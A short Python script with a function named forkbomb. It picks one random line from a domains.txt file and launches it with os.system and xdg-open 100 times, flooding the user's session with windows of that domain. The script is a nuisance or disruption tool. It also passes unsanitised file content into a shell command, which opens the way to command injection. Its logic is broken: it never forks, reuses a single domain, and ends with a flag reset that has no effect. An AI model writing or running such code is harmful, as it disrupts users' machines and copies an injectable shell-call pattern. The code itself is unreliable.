import os
import random
def forkbomb():
  mal = True
  number = 0
  file = open("domains.txt")
  content = file.readlines()
  num = random.randint(0, 20118)
  while mal == True:
    os.system("xdg-open " + content[num])
    number += 1
    if number == 100:
      mal = False
  if mal == False:
    number = 0
    mal = True
